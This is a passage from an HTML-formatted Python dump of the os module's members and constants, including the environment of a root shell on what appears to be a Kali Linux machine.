WEXITSTATUS&gt;, <span class="string">&#x27;WTERMSIG&#x27;</span>: &lt;built-<span class="keyword">in</span> function WTERMSIG&gt;, <span class="string">&#x27;WSTOPSIG&#x27;</span>: &lt;built-<span class="keyword">in</span> function WSTOPSIG&gt;, <span class="string">&#x27;fstatvfs&#x27;</span>: &lt;built-<span class="keyword">in</span> function fstatvfs&gt;, <span class="string">&#x27;statvfs&#x27;</span>: &lt;built-<span class="keyword">in</span> function statvfs&gt;, <span class="string">&#x27;confstr&#x27;</span>: &lt;built-<span class="keyword">in</span> function confstr&gt;, <span class="string">&#x27;sysconf&#x27;</span>: &lt;built-<span class="keyword">in</span> function sysconf&gt;, <span class="string">&#x27;fpathconf&#x27;</span>: &lt;built-<span class="keyword">in</span> function fpathconf&gt;, <span class="string">&#x27;pathconf&#x27;</span>: &lt;built-<span class="keyword">in</span> function pathconf&gt;, <span class="string">&#x27;abort&#x27;</span>: &lt;built-<span class="keyword">in</span> function abort&gt;, <span class="string">&#x27;getloadavg&#x27;</span>: &lt;built-<span class="keyword">in</span> function getloadavg&gt;, <span class="string">&#x27;urandom&#x27;</span>: &lt;built-<span class="keyword">in</span> function urandom&gt;, <span class="string">&#x27;setresuid&#x27;</span>: &lt;built-<span class="keyword">in</span> function setresuid&gt;, <span class="string">&#x27;setresgid&#x27;</span>: &lt;built-<span class="keyword">in</span> function setresgid&gt;, <span class="string">&#x27;getresuid&#x27;</span>: &lt;built-<span class="keyword">in</span> function getresuid&gt;, <span class="string">&#x27;getresgid&#x27;</span>: &lt;built-<span class="keyword">in</span> function getresgid&gt;, <span class="string">&#x27;getxattr&#x27;</span>: &lt;built-<span class="keyword">in</span> function getxattr&gt;, <span class="string">&#x27;setxattr&#x27;</span>: &lt;built-<span class="keyword">in</span> function setxattr&gt;, <span class="string">&#x27;removexattr&#x27;</span>: &lt;built-<span class="keyword">in</span> function removexattr&gt;, <span class="string">&#x27;listxattr&#x27;</span>: &lt;built-<span class="keyword">in</span> function listxattr&gt;, <span class="string">&#x27;get_terminal_size&#x27;</span>: &lt;built-<span class="keyword">in</span> function get_terminal_size&gt;, <span class="string">&#x27;cpu_count&#x27;</span>: &lt;built-<span class="keyword">in</span> function cpu_count&gt;, <span class="string">&#x27;get_inheritable&#x27;</span>: &lt;built-<span class="keyword">in</span> function get_inheritable&gt;, <span class="string">&#x27;set_inheritable&#x27;</span>: &lt;built-<span class="keyword">in</span> function set_inheritable&gt;, <span class="string">&#x27;get_blocking&#x27;</span>: &lt;built-<span class="keyword">in</span> function get_blocking&gt;, <span class="string">&#x27;set_blocking&#x27;</span>: &lt;built-<span class="keyword">in</span> function set_blocking&gt;, <span class="string">&#x27;scandir&#x27;</span>: &lt;built-<span class="keyword">in</span> function scandir&gt;, <span class="string">&#x27;fspath&#x27;</span>: &lt;built-<span class="keyword">in</span> function fspath&gt;, <span class="string">&#x27;getrandom&#x27;</span>: &lt;built-<span class="keyword">in</span> function getrandom&gt;, <span class="string">&#x27;memfd_create&#x27;</span>: &lt;built-<span class="keyword">in</span> function memfd_create&gt;, <span class="string">&#x27;waitstatus_to_exitcode&#x27;</span>: &lt;built-<span class="keyword">in</span> function waitstatus_to_exitcode&gt;, <span class="string">&#x27;environ&#x27;</span>: environ(&#123;<span class="string">&#x27;COLORTERM&#x27;</span>: <span class="string">&#x27;truecolor&#x27;</span>, <span class="string">&#x27;DISPLAY&#x27;</span>: <span class="string">&#x27;:0.0&#x27;</span>, <span class="string">&#x27;LANG&#x27;</span>: <span class="string">&#x27;en_US.UTF-8&#x27;</span>, <span class="string">&#x27;LANGUAGE&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;PATH&#x27;</span>: <span class="string">&#x27;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games&#x27;</span>, <span class="string">&#x27;TERM&#x27;</span>: <span class="string">&#x27;xterm-256color&#x27;</span>, <span class="string">&#x27;XAUTHORITY&#x27;</span>: <span class="string">&#x27;/home/kali/.Xauthority&#x27;</span>, <span class="string">&#x27;LS_COLORS&#x27;</span>: <span class="string">&#x27;rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.webp=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36::ow=30;44:&#x27;</span>, <span class="string">&#x27;MAIL&#x27;</span>: <span class="string">&#x27;/var/mail/root&#x27;</span>, <span class="string">&#x27;LOGNAME&#x27;</span>: <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;USER&#x27;</span>: <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;HOME&#x27;</span>: <span class="string">&#x27;/root&#x27;</span>, <span class="string">&#x27;SHELL&#x27;</span>: <span class="string">&#x27;/usr/bin/zsh&#x27;</span>, <span class="string">&#x27;SUDO_COMMAND&#x27;</span>: <span class="string">&#x27;/usr/bin/su&#x27;</span>, <span class="string">&#x27;SUDO_USER&#x27;</span>: <span class="string">&#x27;kali&#x27;</span>, <span class="string">&#x27;SUDO_UID&#x27;</span>: <span class="string">&#x27;1000&#x27;</span>, <span class="string">&#x27;SUDO_GID&#x27;</span>: <span class="string">&#x27;1000&#x27;</span>, <span class="string">&#x27;COMMAND_NOT_FOUND_INSTALL_PROMPT&#x27;</span>: <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;POWERSHELL_UPDATECHECK&#x27;</span>: <span class="string">&#x27;Off&#x27;</span>, <span class="string">&#x27;POWERSHELL_TELEMETRY_OPTOUT&#x27;</span>: <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;DOTNET_CLI_TELEMETRY_OPTOUT&#x27;</span>: <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;SHLVL&#x27;</span>: <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;PWD&#x27;</span>: <span class="string">&#x27;/home/kali/Desktop&#x27;</span>, <span class="string">&#x27;OLDPWD&#x27;</span>: <span class="string">&#x27;/home/kali&#x27;</span>, <span class="string">&#x27;LESS_TERMCAP_mb&#x27;</span>: <span class="string">&#x27;\x1b[1;31m&#x27;</span>, <span class="string">&#x27;LESS_TERMCAP_md&#x27;</span>: <span class="string">&#x27;\x1b[1;36m&#x27;</span>, <span class="string">&#x27;LESS_TERMCAP_me&#x27;</span>: <span class="string">&#x27;\x1b[0m&#x27;</span>, <span class="string">&#x27;LESS_TERMCAP_so&#x27;</span>: <span class="string">&#x27;\x1b[01;33m&#x27;</span>, <span class="string">&#x27;LESS_TERMCAP_se&#x27;</span>: <span class="string">&#x27;\x1b[0m&#x27;</span>, <span class="string">&#x27;LESS_TERMCAP_us&#x27;</span>: <span class="string">&#x27;\x1b[1;32m&#x27;</span>, <span class="string">&#x27;LESS_TERMCAP_ue&#x27;</span>: <span class="string">&#x27;\x1b[0m&#x27;</span>, <span class="string">&#x27;_&#x27;</span>: <span class="string">&#x27;/usr/bin/python3&#x27;</span>&#125;), <span class="string">&#x27;F_OK&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;R_OK&#x27;</span>: <span class="number">4</span>, <span class="string">&#x27;W_OK&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;X_OK&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;NGROUPS_MAX&#x27;</span>: <span class="number">65536</span>, <span class="string">&#x27;TMP_MAX&#x27;</span>: <span class="number">238328</span>, <span class="string">&#x27;WCONTINUED&#x27;</span>: <span class="number">8</span>, <span class="string">&#x27;WNOHANG&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;WUNTRACED&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;O_RDONLY&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;O_WRONLY&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;O_RDWR&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;O_NDELAY&#x27;</span>: <span class="number">2048</span>, <span class="string">&#x27;O_NONBLOCK&#x27;</span>: <span class="number">2048</span>, <span class="string">&#x27;O_APPEND&#x27;</span>: <span class="number">1024</span>, <span class="string">&#x27;O_DSYNC&#x27;</span>: <span class="number">4096</span>, <span class="string">&#x27;O_RSYNC&#x27;</span>: <span class="number">1052672</span>, <span class="string">&#x27;O_SYNC&#x27;</span>: <span class="number">1052672</span>, <span class="string">&#x27;O_NOCTTY&#x27;</span>: <span class="number">256</span>, <span class="string">&#x27;O_CREAT&#x27;</span>: <span class="number">64</span>, <span class="string">&#x27;O_EXCL&#x27;</span>: <span class="number">128</span>, <span class="string">&#x27;O_TRUNC&#x27;</span>: <span class="number">512</span>, <span class="string">&#x27;O_LARGEFILE&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;O_PATH&#x27;</span>: <span class="number">2097152</span>, <span class="string">&#x27;O_TMPFILE&#x27;</span>: <span class="number">4259840</span>, <span class="string">&#x27;PRIO_PROCESS&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;PRIO_PGRP&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;PRIO_USER&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;O_CLOEXEC&#x27;</span>: <span class="number">524288</span>, <span class="string">&#x27;O_ACCMODE&#x27;</span>: <span class="number">3</span>, <span class="string">&#x27;SEEK_HOLE&#x27;</span>: <span class="number">4</span>, <span class="string">&#x27;SEEK_DATA&#x27;</span>: <span class="number">3</span>, <span class="string">&#x27;O_ASYNC&#x27;</span>: <span class="number">8192</span>, <span class="string">&#x27;O_DIRECT&#x27;</span>: <span class="number">16384</span>, <span class="string">&#x27;O_DIRECTORY&#x27;</span>: <span class="number">65536</span>, <span class="string">&#x27;O_NOFOLLOW&#x27;</span>: <span class="number">131072</span>, <span class="string">&#x27;O_NOATIME&#x27;</span>: <span class="number">262144</span>, <span class="string">&#x27;EX_OK&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;EX_USAGE&#x27;</span>: <span class="number">64</span>, <span class="string">&#x27;EX_DATAERR&#x27;</span>: <span class="number">65</span>, <span class="string">&#x27;EX_NOINPUT&#x27;</span>: <span class="number">66</span>, <span class="string">&#x27;EX_NOUSER&#x27;</span>: <span class="number">67</span>, <span class="string">&#x27;EX_NOHOST&#x27;</span>: <span class="number">68</span>, <span class="string">&#x27;EX_UNAVAILABLE&#x27;</span>: <span class="number">69</span>, <span class="string">&#x27;EX_SOFTWARE&#x27;</span>: <span class="number">70</span>, <span class="string">&#x27;EX_OSERR&#x27;</span>: <span class="number">71</span>, <span class="string">&#x27;EX_OSFILE&#x27;</span>: <span class="number">72</span>, <span class="string">&#x27;EX_CANTCREAT&#x27;</span>: <span class="number">73</span>, <span class="string">&#x27;EX_IOERR&#x27;</span>: <span class="number">74</span>, <span class="string">&#x27;EX_TEMPFAIL&#x27;</span>: <span class="number">75</span>, <span class="string">&#x27;EX_PROTOCOL&#x27;</span>: <span class="number">76</span>, <span class="string">&#x27;EX_NOPERM&#x27;</span>: <span class="number">77</span>, <span class="string">&#x27;EX_CONFIG&#x27;</span>: <span class="number">78</span>, <span class="string">&#x27;ST_RDONLY&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;ST_NOSUID&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;ST_NODEV&#x27;</span>: <span class="number">4</span>, <span class="string">&#x27;ST_NOEXEC&#x27;</span>: <span class="number">8</span>, <span class="string">&#x27;ST_SYNCHRONOUS&#x27;</span>: <span class="number">16</span>, <span class="string">&#x27;ST_MANDLOCK&#x27;</span>: <span class="number">64</span>, <span class="string">&#x27;ST_WRITE&#x27;</span>: <span class="number">128</span>, <span class="string">&#x27;ST_APPEND&#x27;</span>: <span class="number">256</span>, <span class="string">&#x27;ST_NOATIME&#x27;</span>: <span class="number">1024</span>, <span class="string">&#x27;ST_NODIRATIME&#x27;</span>: <span class="number">2048</span>, <span class="string">&#x27;ST_RELATIME&#x27;</span>: <span class="number">4096</span>, <span class="string">&#x27;POSIX_FADV_NORMAL&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;POSIX_FADV_SEQUENTIAL&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;POSIX_FADV_RANDOM&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;POSIX_FADV_NOREUSE&#x27;</span>: <span class="number">5</span>, <span class="string">&#x27;POSIX_FADV_WILLNEED&#x27;</span>: <span class="number">3</span>, <span class="string">&#x27;POSIX_FADV_DONTNEED&#x27;</span>: <span class="number">4</span>, <span class="string">&#x27;P_PID&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;P_PGID&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;P_ALL&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;P_PIDFD&#x27;</span>: <span class="number">3</span>, <span class="string">&#x27;WEXITED&#x27;</span>: <span class="number">4</span>, <span class="string">&#x27;WNOWAIT&#x27;</span>: <span class="number">16777216</span>, <span class="string">&#x27;WSTOPPED&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;CLD_EXITED&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;CLD_KILLED&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;CLD_DUMPED&#x27;</span>: <span class="number">3</span>, <span class="string">&#x27;CLD_TRAPPED&#x27;</span>: <span class="number">4</span>, <span class="string">&#x27;CLD_STOPPED&#x27;</span>: <span class="number">5</span>, <span class="string">&#x27;CLD_CONTINUED&#x27;</span>: <span class="number">6</span>, <span class="string">&#x27;F_LOCK&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;F_TLOCK&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;F_ULOCK&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;F_TEST&#x27;</span>: <span class="number">3</span>, <span class="string">&#x27;RWF_DSYNC&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;RWF_HIPRI&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;RWF_SYNC&#x27;</span>: <span class="number">4</span>, <span class="string">&#x27;RWF_NOWAIT&#x27;</span>: <span class="number">8</span>, <span class="string">&#x27;POSIX_SPAWN_OPEN&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;POSIX_SPAWN_CLOSE&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;POSIX_SPAWN_DUP2&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;SCHED_OTHER&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;SCHED_FIFO&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;SCHED_RR&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;SCHED_BATCH&#x27;</span>: <span class="number">3</span>, <span class="string">&#x27;SCHED_IDLE&#x27;</span>: <span class="number">5</span>, <span class="string">&#x27;SCHED_RESET_ON_FORK&#x27;</span>: <span class="number">1073741824</span>, <span class="string">&#x27;XATTR_CREATE&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;XATTR_REPLACE&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;XATTR_SIZE_MAX&#x27;</span>: <span class="number">65536</span>, <span class="string">&#x27;RTLD_LAZY&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;RTLD_NOW&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;RTLD_GLOBAL&#x27;</span>: <span class="number">256</span>, <span class="string">&#x27;RTLD_LOCAL&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;RTLD_NODELETE&#x27;</span>: <span class="number">4096</span>, <span class="string">&#x27;RTLD_NOLOAD&#x27;</span>: <span class="number">4</span>, <span class="string">&#x27;RTLD_DEEPBIND&#x27;</span>: <span class="number">8</span>, <span class="string">&#x27;GRND_RANDOM&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;GRND_NONBLOCK&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;MFD_CLOEXEC&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;MFD_ALLOW_SEALING&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;MFD_HUGETLB&#x27;</span>: <span class="number">4</span>, <span class="string">&#x27;MFD_HUGE_SHIFT&#x27;</span>: <span class="number">26</span>, <span class="string">&#x27;MFD_HUGE_MASK&#x27;</span>: <span class="number">63</span>, <span class="string">&#x27;MFD_HUGE_64KB&#x27;</span>: <span class="number">1073741824</span>, <span class="string">&#x27;MFD_HUGE_512KB&#x27;</span>: <span class="number">1275068416</span>, <span class="string">&#x27;MFD_HUGE_1MB&#x27;</span>: <span class="number">1342177280</span>, <span class="string">&#x27;MFD_HUGE_2MB&#x27;</span>: <span class="number">1409286144</span>, <span class="string">&#x27;MFD_HUGE_8MB&#x27;</span>: <span class="number">1543503872</span>, <span class="string">&#x27;MFD_HUGE_16MB&#x27;</span>: <span class="number">1610612736</span>, <span class="string">&#x27;MFD_HUGE_32MB&#x27;</span>: <span class="number">1677721600</span>, <span class="string">&#x27;MFD_HUGE_256MB&#x27;</span>: <span class="number">1879048192</span>, <span class="string">&#x27;MFD_HUGE_512MB&#x27;</span>: <span class="number">1946157056</span>, <span class="string">&#x27;MFD_HUGE_1GB&#x27;</span>: <span class="number">2013265920</span>, <span class="string">&#x27;MFD_HUGE_2GB&#x27;</span>: <span class="number">2080374784</span>, <span class="string">&#x27;MFD_HUGE_16GB&#x27;</span>: -<span class="number">2013265920</span>, <span class="string">&#x27;pathconf_names&#x27;</span>: &#123;<span class="string">&#x27;PC_ALLOC_SIZE_MIN&#x27;</span>: <span class="number">18</span>, <span class="string">&#x27;PC_ASYNC_IO&#x27;</span>: <span class="number">10</span>, <span class="string">&#x27;PC_CHOWN_RESTRICTED&#x27;</span>: <span class="number">6</span>, <span class="string">&#x27;PC_FILESIZEBITS&#x27;</span>: <span class="number">13</span>, <span class="string">&#x27;PC_LINK_MAX&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;PC_MAX_CANON&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;PC_MAX_INPUT&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;PC_NAME_MAX&#x27;</span>: <span class="number">3</span>, <span class="string">&#x27;PC_NO_TRUNC&#x27;</span>: <span class="number">7</span>, <span class="string">&#x27;PC_PATH_MAX&#x27;</span>: <span class="number">4</span>, <span class="string">&#x27;PC_PIPE_BUF&#x27;</span>: <span class="number">5</span>, <span class="string">&#x27;PC_PRIO_IO&#x27;</span>: <span class="number">11</span>, <span class="string">&#x27;PC_REC_INCR_XFER_SIZE&#x27;</span>: <span class="number">14</span>, <span class="string">&#x27;PC_REC_MAX_XFER_SIZE&#x27;</span>: <span class="number">15</span>, <span class="string">&#x27;PC_REC_MIN_XFER_SIZE&#x27;</span>: <span class="number">16</span>, <span class="string">&#x27;PC_REC_XFER_ALIGN&#x27;</span>: <span class="number">17</span>, <span class="string">&#x27;PC_SOCK_MAXBUF&#x27;</span>: <span class="number">12</span>, <span class="string">&#x27;PC_SYMLINK_MAX&#x27;</span>: <span class="number">19</span>, <span class="string">&#x27;PC_SYNC_IO&#x27;</span>: <span class="number">9</span>, <span class="string">&#x27;PC_VDISABLE&#x27;</span>: <span class="number">8</span>&#125;, <span class="string">&#x27;confstr_names&#x27;</span>: &#123;<span class="string">&#x27;CS_GNU_LIBC_VERSION&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;CS_GNU_LIBPTHREAD_VERSION&#x27;</span>: <span class="number">3</span>, <span class="string">&#x27;CS_LFS64_CFLAGS&#x27;</span>: <span class="number">1004</span>, <span class="string">&#x27;CS_LFS64_LDFLAGS&#x27;</span>: <span class="number">1005</span>, <span class="string">&#x27;CS_LFS64_LIBS&#x27;</span>: <span class="number">1006</span>, <span class="string">&#x27;CS_LFS64_LINTFLAGS&#x27;</span>: <span class="number">1007</span>, <span class="string">&#x27;CS_LFS_CFLAGS&#x27;</span>: <span class="number">1000</span>, <span class="string">&#x27;CS_LFS_LDFLAGS&#x27;</span>: <span class="number">1001</span>, <span class="string">&#x27;CS_LFS_LIBS&#x27;</span>: <span class="number">1002</span>, <span class="string">&#x27;CS_LFS_LINTFLAGS&#x27;</span>: <span class="number">1003</span>, <span class="string">&#x27;CS_PATH&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;CS_XBS5_ILP32_OFF32_CFLAGS&#x27;</span>: <span class="number">1100</span>, <span class="string">&#x27;CS_XBS5_ILP32_OFF32_LDFLAGS&#x27;</span>: <span class="number">1101</span>, <span class="string">&#x27;CS_XBS5_ILP32_OFF32_LIBS&#x27;</span>: <span class="number">1102</span>, <span class="string">&#x27;CS_XBS5_ILP32_OFF32_LINTFLAGS&#x27;</span>: <span class="number">1103</span>, <span class="string">&#x27;CS_XBS5_ILP32_OFFBIG_CFLAGS&#x27;</span>: <span class="number">1104</span>, <span class="string">&#x27;CS_XBS5_ILP32_OFFBIG_LDFLAGS&#x27;</span>: <span class="number">1105</span>, <span class="string">&#x27;CS_XBS5_ILP32_OFFBIG_LIBS&#x27;</span>: <span class="number">1106</span>, <span class="string">&#x27;CS_XBS5_ILP32_OFFBIG_LINTFLAGS&#x27;</span>: <span class="number">1107</span>, <span class="string">&#x27;CS_XBS5_LP64_OFF64_CFLAGS&#x27;</span>: <span class="number">1108</span>, <span class="string">&#x27;CS_XBS5_LP64_OFF64_LDFLAGS&#x27;</span>: <span class="number">1109</span>, <span class="string">&#x27;CS_XBS5_LP64_OFF64_LIBS&#x27;</span>: <span class="number">1110</span>, <span class="string">&#x27;CS_XBS5_LP64_OFF64_LINTFLAGS&#x27;</span>: <span class="number">1111</span>, <span class="string">&#x27;CS_XBS5_LPBIG_OFFBIG_CFLAGS&#x27;</span>: <span class="number">1112</span>, <span class="string">&#x27;CS_XBS5_LPBIG_OFFBIG_LDFLAGS&#x27;</span>: <span class="number">1113</span>, <span class="string">&#x27;CS_XBS5_LPBIG_OFFBIG_LIBS&#x27;</span>: <span class="number">1114</span>, <span class="string">&#x27;CS_XBS5_LPBIG_OFFBIG_LINTFLAGS&#x27;</span>: <span class="number">1115</span>&#125;, <span class="string">&#x27;sysconf_names&#x27;</span>: &#123;<span class="string">&#x27;SC_2_CHAR_TERM&#x27;</span>: <span class="number">95</span>, <span class="string">&#x27;SC_2_C_BIND&#x27;</span>: <span class="number">47</span>, <span class="string">&#x27;SC_2_C_DEV&#x27;</span>: <span class="number">48</span>, <span class="string">&#x27;SC_2_C_VERSION&#x27;</span>: <span class="number">96</span>, <span class="string">&#x27;SC_2_FORT_DEV&#x27;</span>: <span class="number">49</span>, <span class="string">&#x27;SC_2_FORT_RUN&#x27;</span>: <span class="number">50</span>, <span class="string">&#x27;SC_2_LOCALEDEF&#x27;</span>: <span class="number">52</span>, <span class="string">&#x27;SC_2_SW_DEV&#x27;</span>: <span class="number">51</span>, <span class="string">&#x27;SC_2_UPE&#x27;</span>: <span class="number">97</span>, <span class="string">&#x27;SC_2_VERSION&#x27;</span>: <span class="number">46</span>, <span class="string">&#x27;SC_AIO_LISTIO_MAX&#x27;</span>: <span class="number">23</span>, <span class="string">&#x27;SC_AIO_MAX&#x27;</span>: <span class="number">24</span>, <span class="string">&#x27;SC_AIO_PRIO_DELTA_MAX&#x27;</span>: <span class="number">25</span>, <span class="string">&#x27;SC_ARG_MAX&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;SC_ASYNCHRONOUS_IO&#x27;</span>: <span class="number">12</span>, <span class="string">&#x27;SC_ATEXIT_MAX&#x27;</span>: <span class="number">87</span>, <span class="string">&#x27;SC_AVPHYS_PAGES&#x27;</span>: <span class="number">86</span>, <span class="string">&#x27;SC_BC_BASE_MAX&#x27;</span>: <span class="number">36</span>, <span class="string">&#x27;SC_BC_DIM_MAX&#x27;</span>: <span class="number">37</span>, <span class="string">&#x27;SC_BC_SCALE_MAX&#x27;</span>: <span class="number">38</span>, <span class="string">&#x27;SC_BC_STRING_MAX&#x27;</span>: <span class="number">39</span>, <span class="string">&#x27;SC_CHARCLASS_NAME_MAX&#x27;</span>: <span class="number">45</span>, <span class="string">&#x27;SC_CHAR_BIT&#x27;</span>: <span class="number">101</span>, <span class="string">&#x27;SC_CHAR_MAX&#x27;</span>: <span class="number">102</span>, <span class="string">&#x27;SC_CHAR_MIN&#x27;</span>: <span class="number">103</span>, <span class="string">&#x27;SC_CHILD_MAX&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;SC_CLK_TCK&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;SC_COLL_WEIGHTS_MAX&#x27;</span>: <span class="number">40</span>, <span class="string">&#x27;SC_DELAYTIMER_MAX&#x27;</span>: <span class="number">26</span>, <span class="string">&#x27;SC_EQUIV_CLASS_MAX&#x27;</span>: <span class="number">41</span>, <span class="string">&#x27;SC_EXPR_NEST_MAX&#x27;</span>: <span class="number">42</span>, <span class="string">&#x27;SC_FSYNC&#x27;</span>: <span class="number">15</span>, <span class="string">&#x27;SC_GETGR_R_SIZE_MAX&#x27;</span>: <span class="number">69</span>, <span class="string">&#x27;SC_GETPW_R_SIZE_MAX&#x27;</span>: <span class="number">70</span>, <span class="string">&#x27;SC_INT_MAX&#x27;</span>: <span class="number">104</span>, <span class="string">&#x27;SC_INT_MIN&#x27;</span>: <span class="number">105</span>, <span class="string">&#x27;SC_IOV_MAX&#x27;</span>: <span class="number">60</span>, <span class="string">&#x27;SC_JOB_CONTROL&#x27;</span>: <span class="number">7</span>, <span class="string">&#x27;SC_LINE_MAX&#x27;</span>: <span class="number">43</span>, <span class="string">&#x27;SC_LOGIN_NAME_MAX&#x27;</span>: <span class="number">71</span>, <span class="string">&#x27;SC_LONG_BIT&#x27;</span>: <span class="number">106</span>, <span class="string">&#x27;SC_MAPPED_FILES&#x27;</span>: <span class="number">16</span>, <span class="string">&#x27;SC_MB_LEN_MAX&#x27;</span>: <span class="number">108</span>, <span class="string">&#x27;SC_MEMLOCK&#x27;</span>: <span class="number">17</span>, <span class="string">&#x27;SC_MEMLOCK_RANGE&#x27;</span>: <span class="number">18</span>, <span class="string">&#x27;SC_MEMORY_PROTECTION&#x27;</span>: <span class="number">19</span>, <span class="string">&#x27;SC_MESSAGE_PASSING&#x27;</span>: <span class="number">20</span>, <span class="string">&#x27;SC_MQ_OPEN_MAX&#x27;</span>: <span class="number">27</span>, <span class="string">&#x27;SC_MQ_PRIO_MAX&#x27;</span>: <span class="number">28</span>, <span class="string">&#x27;SC_NGROUPS_MAX&#x27;</span>: <span class="number">3</span>, <span class="string">&#x27;SC_NL_ARGMAX&#x27;</span>: <span class="number">119</span>, <span class="string">&#x27;SC_NL_LANGMAX&#x27;</span>: <span class="number">120</span>, <span class="string">&#x27;SC_NL_MSGMAX&#x27;</span>: <span class="number">121</span>, <span class="string">&#x27;SC_NL_NMAX&#x27;</span>: <span class="number">122</span>, <span class="string">&#x27;SC_NL_SETMAX&#x27;</span>: <span class="number">123</span>, <span class="string">&#x27;SC_NL_TEXTMAX&#x27;</span>: <span class="number">124</span>, <span class="string">&#x27;SC_NPROCESSORS_CONF&#x27;</span>: <span class="number">83</span>, <span class="string">&#x27;SC_NPROCESSORS_ONLN&#x27;</span>: <span class="number">84</span>, <span class="string">&#x27;SC_NZERO&#x27;</span>: <span class="number">109</span>, <span class="string">&#x27;SC_OPEN_MAX&#x27;</span>: <span class="number">4</span>, <span class="string">&#x27;SC_PAGESIZE&#x27;</span>: <span class="number">30</span>, <span class="string">&#x27;SC_PAGE_SIZE&#x27;</span>: <span class="number">30</span>, <span class="string">&#x27;SC_PASS_MAX&#x27;</span>: <span class="number">88</span>, <span 